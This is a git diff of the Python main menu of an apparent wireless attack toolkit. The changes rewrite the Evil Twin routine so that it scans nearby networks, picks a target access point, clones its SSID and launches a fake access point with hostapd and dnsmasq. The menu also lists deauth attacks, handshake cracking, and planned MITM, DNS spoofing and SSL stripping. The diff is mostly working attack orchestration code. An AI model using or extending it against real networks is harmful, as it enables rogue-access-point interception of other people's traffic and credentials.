@@ -2,12 +2,12 @@ import os
 import time
 import subprocess
 import threading
-# Local imports
+# Local imports 
 from utils.banner import banner, team
 from utils.network_utils import set_managed_mode, set_monitor_mode, run_scan, display_and_choose_ap
 from attacks.deauth_attack import deauth_worker
 from attacks.capture_attack import capture_worker
-#from attacks.evil_twin import EvilTwin
+from attacks.evil_twin import *
 
 # Global configuration
 interface = "wlan0"
@@ -22,16 +22,21 @@ def main_menu():
         print("1. Deauth Attack")
         print("2. Handshake Cracker")
         print("3. Evil Twin Attack")
+        print("4. MITM Attack (Coming Soon)")
+        print("5. DNS Spoofing (Coming Soon)")
+        print("6. SSL Stripping (Coming Soon)")
         print("0. Exit")
         
-        choice = input("\nSelect an option (1-3): ").strip()
+        choice = input("\nSelect an option (0-6): ").strip()
         
         if choice == "1":
             deauth_menu()
         elif choice == "2":
             cracker_menu()
         elif choice == "3":
-            evil_twin_menu()  
+            evil_twin_menu()
+        elif choice in ["4", "5", "6"]:
+            print("\n[!] This feature is under development. Coming soon...")
         elif choice == "0":
             print("Exiting...")
             break
@@ -225,29 +230,54 @@ def get_bssid_from_cap(cap_file):
         return ""
     
 def evil_twin_menu():
-    from utils.network_utils import set_managed_mode
     global interface
     print("\n" + "="*40)
     print("Evil Twin Attack")
     print("="*40)
-    # ensure interface in managed/AP mode
-    set_managed_mode(interface)
-    ssid = input("Enter SSID to clone: ").strip()
-    channel = input("Enter channel number: ").strip()
-    # create config files
-    hostapd_conf = create_hostapd_config(interface, ssid, channel)
-    dnsmasq_conf = create_dnsmasq_config(interface)
-    if hostapd_conf and dnsmasq_conf:
-        setup_fake_ap_network(interface)
-        commands = [
-            f"hostapd {hostapd_conf}",
-            f"dnsmasq -C {dnsmasq_conf} -d",
-            f"dnsspoof -i {interface}"
-        ]
-        for cmd in commands:
-            open_terminal_with_command(cmd)
-    else:
-        print("[-] Failed to create required config files. Exiting.")
+    
+    # Initialize stop_event first
+    stop_event = threading.Event()
+    
+    try:
+        # Scan networks
+        aps = run_scan(interface)
+        if not aps:
+            print("No networks found. Returning to main menu.")
+            return
+
+        # Select target AP
+        bssid, channel = display_and_choose_ap(aps)
+        if not bssid or not channel:
+            return
+
+        # Get SSID from selected AP
+        ssid = next((ap['ESSID'] for ap in aps if ap['BSSID'] == bssid), "UNKNOWN_SSID")
+
+        # Create attack directory
+        safe_ssid = "".join(c if c.isalnum() else "_" for c in ssid)
+        output_dir = os.path.join(base_capture_dir, "evil_twin", safe_ssid)
+        os.makedirs(output_dir, exist_ok=True)
+
+        # Removed deauth code block entirely
+
+        # Setup evil twin
+        set_managed_mode(interface)
+        hostapd_conf = create_hostapd_config(interface, ssid, channel, output_dir)
+        dnsmasq_conf = create_dnsmasq_config(interface, output_dir)
+        
+        if hostapd_conf and dnsmasq_conf:
+            setup_fake_ap_network(interface)
+            launch_attack_services(interface, hostapd_conf, dnsmasq_conf)
+            
+            print("\n[!] Evil Twin running. Press Ctrl+C to stop...")
+            while True: 
+                time.sleep(1)
+                
+    except KeyboardInterrupt:
+        print("\nStopping attack...")
+        stop_event.set()
+        set_managed_mode(interface)
+        print("Attack cleaned up")
 
 
 if __name__ == "__main__":
